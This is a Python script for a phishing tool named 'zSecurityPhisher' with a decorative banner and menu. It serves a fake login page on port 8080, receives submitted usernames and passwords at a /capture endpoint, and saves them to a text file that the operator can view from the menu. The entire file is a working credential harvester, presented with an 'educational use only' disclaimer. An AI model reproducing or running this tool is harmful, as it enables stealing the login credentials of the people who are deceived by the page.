import os
import time
import json
import pyfiglet
from colorama import Fore, Style, init
from rich.console import Console
import http.server
import socketserver
import sys

# Initialize colorama and rich console
init(autoreset=True)
console = Console()

# Configuration
PORT = 8080
PHISHING_PAGE = "index.html"
CAPTURED_DATA_FILE = "captured_data.txt"

# Clear terminal screen
def clear():
    os.system("cls" if os.name == "nt" else "clear")

# Fancy typing animation
def animated_print(text, color=Fore.WHITE, delay=0.03):
    for char in text:
        print(color + char, end="", flush=True)
        time.sleep(delay)
    print(Style.RESET_ALL)

# Show banner with clean design
def show_banner():
    clear()
    
    banner = pyfiglet.figlet_format("zSecurityPhisher", font="slant")
    console.print("=" * 60, style="bold magenta")
    console.print(banner, style="bold red")
    console.print("=" * 60, style="bold magenta")
    
    animated_print("  ⚡ Created by zSecurity ⚡".center(60), Fore.YELLOW)
    animated_print("  🛡️  Ethical Hacking Tool for Education Only".center(60), Fore.LIGHTWHITE_EX)
    console.print("=" * 60, style="bold magenta")

    animated_print("▶ About Me:", Fore.GREEN)
    animated_print("Cybersecurity enthusiast | MERN Stack Developer".center(60), Fore.LIGHTCYAN_EX)
    animated_print("YouTube Channel: zSecurity".center(60), Fore.LIGHTBLUE_EX)
    animated_print("https://www.youtube.com/@zsecurity01".center(60), Fore.CYAN)
    console.print("=" * 60, style="bold magenta")

    console.print("[bold red]⚠️  DISCLAIMER: Educational Use Only![/bold red]")
    console.print("[bold red]⚠️  Don’t use this tool for illegal activity.[/bold red]")
    console.print("=" * 60, style="bold magenta")

# Show options menu with color styling
def show_menu():
    console.print("\n[bold yellow][1] Start Phishing[/bold yellow]")
    console.print("[bold yellow][2] View Captured Data[/bold yellow]")
    console.print("[bold yellow][3] Exit\n[/bold yellow]")
    return input(Fore.CYAN + "Enter your choice: ")

# HTTP Request Handler
class MyHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        if self.path == "/":
            self.path = f"/{PHISHING_PAGE}"
        return http.server.SimpleHTTPRequestHandler.do_GET(self)

    def do_POST(self):
        if self.path == "/capture":
            content_length = int(self.headers["Content-Length"])
            post_data = self.rfile.read(content_length)
            credentials = json.loads(post_data)

            with open(CAPTURED_DATA_FILE, "a") as file:
                file.write(f"Username: {credentials['username']} | Password: {credentials['password']}\n")

            self.send_response(200)
            self.send_header("Content-type", "text/plain")
            self.end_headers()
            self.wfile.write(b"Captured")

# Start local phishing server
def start_phishing():
    if not os.path.exists(PHISHING_PAGE):
        console.print("[bold red][!] Phishing page not found![/bold red]")
        return

    console.print(f"[green][+] Starting phishing server on port {PORT}...[/green]")
    handler = MyHandler
    os.chdir(os.path.dirname(os.path.abspath(__file__)))

    with socketserver.TCPServer(("", PORT), handler) as httpd:
        console.print("[cyan][*] Server is running... Press Ctrl+C to stop.[/cyan]")
        try:
            httpd.serve_forever()
        except KeyboardInterrupt:
            console.print("\n[bold red][!] Server stopped.[/bold red]")

# View saved data
def view_captured_data():
    if not os.path.exists(CAPTURED_DATA_FILE):
        console.print("[bold red][!] No captured data found![/bold red]")
        return

    with open(CAPTURED_DATA_FILE, "r") as file:
        data = file.read()
        console.print("\n[bold green][+] Captured Data:[/bold green]\n")
        console.print(data, style="bold white")

# Main loop
def main():
    show_banner()
    while True:
        choice = show_menu()
        if choice == "1":
            start_phishing()
        elif choice == "2":
            view_captured_data()
        elif choice == "3":
            console.print("[bold red][!] Exiting...[/bold red]")
            sys.exit()
        else:
            console.print("[bold red][!] Invalid choice, try again.[/bold red]")

# Run the tool
if __name__ == "__main__":
    main()
